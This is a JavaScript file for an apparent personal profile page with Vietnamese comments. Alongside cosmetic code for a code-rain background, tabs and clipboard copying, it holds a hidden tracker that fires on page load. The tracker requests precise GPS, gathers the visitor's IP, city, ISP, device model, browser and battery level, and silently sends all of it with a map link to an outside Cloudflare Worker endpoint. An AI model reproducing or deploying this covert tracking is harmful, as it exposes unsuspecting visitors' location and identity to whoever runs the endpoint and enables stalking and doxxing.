// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

 // --- 1. CẤU HÌNH ---
// Link Cloudflare Worker đã triển khai thành công của bạn
const workerUrl = "https://profile-easy.dangtoanvu07.workers.dev";

let isBotActive = false;

// --- 2. HÀM RUNG THIẾT BỊ ---
function triggerVibrate() {
    if (navigator.vibrate) {
        navigator.vibrate(500);
    }
}

// --- 3. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT CỤ THỂ ---
async function getFullDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt lạ";
    let os = "Không rõ";
    let model = "Thiết bị ẩn";
    let battery = "Không rõ";

    // Lấy thông tin Pin
    try {
        const bt = await navigator.getBattery();
        battery = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Đang sạc ⚡' : 'Pin thường'})`;
    } catch (e) {}

    // Nhận diện Hệ điều hành & Model chi tiết
    if (ua.includes("Win")) {
        os = "Windows"; model = "PC/Laptop";
    } else if (ua.includes("iPhone")) {
        os = "iOS";
        const screenStr = `${screen.width}x${screen.height}`;
        const iphoneMap = {
            "430x932": "iPhone 14/15 Pro Max",
            "393x852": "iPhone 14/15 Pro",
            "428x926": "iPhone 12/13/14 Pro Max",
            "390x844": "iPhone 12/13/14/15",
            "375x812": "iPhone X/11 Pro/12 Mini",
            "414x896": "iPhone XR/11 Pro Max"
        };
        model = iphoneMap[screenStr] || "iPhone (Đời mới)";
    } else if (ua.includes("Android")) {
        os = "Android";
        const match = ua.match(/Android\s+([\d\.]+);.*?\s+([^;]+)\s+Build/);
        model = match ? match[2] : "Điện thoại Android";
    } else if (ua.includes("Macintosh")) {
        os = "MacOS"; model = "MacBook/iMac";
    }

    // --- NHẬN DIỆN TRÌNH DUYỆT CỤ THỂ ---
    if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) {
        browser = "Cốc Cốc";
    } else if (ua.includes("Edg/")) {
        browser = "Microsoft Edge";
    } else if (ua.includes("CriOS")) {
        browser = "Google Chrome (iOS)";
    } else if (ua.includes("Chrome") && !ua.includes("Edg/")) {
        browser = "Google Chrome";
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        browser = "Safari";
    }

    return { browser, os, model, battery };
}

// --- 4. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (ISP) ---
async function fetchIpData() {
    try {
        // Sử dụng ipwho.is để lấy đầy đủ thông tin nhất
        const response = await fetch('https://ipwho.is/');
        const d = await response.json();
        return {
            ip: d.ip || "Không rõ",
            city: d.city || "Không rõ",
            isp: d.connection?.isp || d.org || "Không rõ"
        };
    } catch (e) {
        return { ip: "Lỗi lấy IP", city: "Lỗi", isp: "Lỗi" };
    }
}

// --- 5. GỬI THÔNG BÁO QUA CLOUDFLARE WORKER ---
async function sendNotification(pos) {
    if (isBotActive) return;
    isBotActive = true;// Lấy tất cả dữ liệu cần thiết
    const info = await fetchIpData();
    const device = await getFullDeviceInfo();
    const time = new Date().toLocaleString('vi-VN');

    // Xây dựng nội dung tin nhắn (Đã sửa các biến undefined)
    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
    msg += `📍 <b>Thành phố:</b> <code>${info.city}</code>\n`;
    msg += `🏢 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;
    msg += `📱 <b>Thông tin thiết bị:</b>\n`;
    msg += `- Thiết bị: <b>${device.model}</b>\n`;
    msg += `- Hệ điều hành: <code>${device.os}</code>\n`;
    msg += `- Trình duyệt: <b>${device.browser}</b>\n`;
    msg += `- Mức Pin: 🔋 <b>${device.battery}</b>\n`;

    if (pos && pos.coords) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        msg += `\n📍 <b>Vị trí GPS:</b>\n`;
        msg += `👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
    } else {
        msg += `\n⚠️ <b>GPS:</b> Bị từ chối\n`;
    }

    try {
        // Gửi dữ liệu đến Cloudflare Worker
        await fetch(workerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg })
        });
    } catch (err) {
        console.error("Lỗi gửi Worker:", err);
    } finally {
        isBotActive = false;
    }
}

// --- 6. KHỞI CHẠY KHI VÀO TRANG ---
async function start() {
    triggerVibrate();
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendNotification(pos),
            () => sendNotification(null),
            { enableHighAccuracy: true, timeout: 8000 }
        );
    } else {
        sendNotification(null);
    }
}

window.onload = start;
